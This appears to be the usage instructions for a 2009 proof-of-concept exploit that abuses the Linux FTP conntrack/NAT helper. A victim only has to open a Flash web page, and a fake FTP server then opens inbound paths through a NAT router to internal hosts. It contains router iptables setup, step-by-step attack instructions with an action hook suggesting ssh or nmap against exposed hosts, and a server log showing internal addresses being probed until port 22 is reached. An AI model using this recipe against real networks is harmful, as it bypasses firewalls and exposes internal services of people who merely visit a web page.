================================================================================
 Usage example
================================================================================

Client (any OS)
eth0: 192.168.0.10/24

Router (Linux with NAT and conntrack_ftp, see below)
eth0: 192.168.0.1/24
eth1: x.x.x.x

Fake-FTP server (any OS)
eth0: y.y.y.y

0. Set-up router like theese:
------
iptables -A FORWARD -s 192.168.0.0/24 -o eth1 -j ACCEPT
iptables -A FORWARD -d 192.168.0.0/24 -i eth1 -j ACCEPT
iptables -P FORWARD DROP

iptables -t nat -A POSTROUTING -s 192.168.0.0/24 -o eth1 -j SNAT --to-source x.x.x.x
sysctl -w net.ipv4.conf.all.forwarding=1
modprobe nf_conntract_ftp
modprobe nf_nat_ftp
------

1. Run flash policy server on y.y.y.y (java -jar ./server.jar)
	source http://jsocket.googlecode.com/svn/trunk/jsocket/samples/server/java/
2. Add your action at check(self, ip, port) in fake-server.py,
	e.g. screen -d -m ssh ip -p port or nmap ip -p port &> log.txt
3. Run fake-server.py on y.y.y.y
4. Change IP address in example.html to y.y.y.y and put it on web server (any)
5. Ask client to open example.html, only this action from client is required
Flash have to be enabled, but you can reimplement this page using WebSockets or applets
6. Wait for example.html

fake-server log:
------
2009-12-27 10:08:41,776 DEBUG ('x.x.x.x', 43640): USER anonymous
2009-12-27 10:08:41,791 DEBUG ('x.x.x.x', 43640): PASS test@example.com
2009-12-27 10:08:41,797 DEBUG ('x.x.x.x', 43640): PORT 192,168,0,2,0,22
2009-12-27 10:08:41,797 DEBUG ('x.x.x.x', 43640): PORT failed
2009-12-27 10:08:41,806 DEBUG ('x.x.x.x', 43640): PORT 192,168,0,3,0,22
2009-12-27 10:08:41,806 DEBUG ('x.x.x.x', 43640): PORT failed
2009-12-27 10:08:41,823 DEBUG ('x.x.x.x', 43640): PORT 192,168,0,4,0,22
2009-12-27 10:08:41,823 DEBUG ('x.x.x.x', 43640): PORT failed
2009-12-27 10:08:41,835 DEBUG ('x.x.x.x', 43640): PORT 192,168,0,5,0,22
2009-12-27 10:08:41,835 DEBUG ('x.x.x.x', 43640): PORT failed
2009-12-27 10:08:41,846 DEBUG ('x.x.x.x', 43640): PORT 192,168,0,6,0,22
2009-12-27 10:08:41,846 DEBUG ('x.x.x.x', 43640): PORT failed
2009-12-27 10:08:41,853 DEBUG ('x.x.x.x', 43640): PORT 192,168,0,7,0,22
2009-12-27 10:08:41,854 DEBUG ('x.x.x.x', 43640): PORT failed
2009-12-27 10:08:41,862 DEBUG ('x.x.x.x', 43640): PORT 192,168,0,8,0,22
2009-12-27 10:08:41,862 DEBUG ('x.x.x.x', 43640): PORT failed
2009-12-27 10:08:41,872 DEBUG ('x.x.x.x', 43640): PORT 192,168,0,9,0,22
2009-12-27 10:08:41,873 DEBUG ('x.x.x.x', 43640): PORT failed
2009-12-27 10:08:41,884 DEBUG ('x.x.x.x', 43640): PORT x,x,x,x,0,22  # PORT body has been changed
2009-12-27 10:08:41,884 INFO ('x.x.x.x', 43640): PORT success
2009-12-27 10:08:41,884 INFO ('x.x.x.x', 43640): probing x.x.x.x:22
2009-12-27 10:08:41,884 DEBUG ('x.x.x.x', 43640): port 22 works
2009-12-27 10:08:41,886 INFO x.x.x.x:43640 disconnected
------

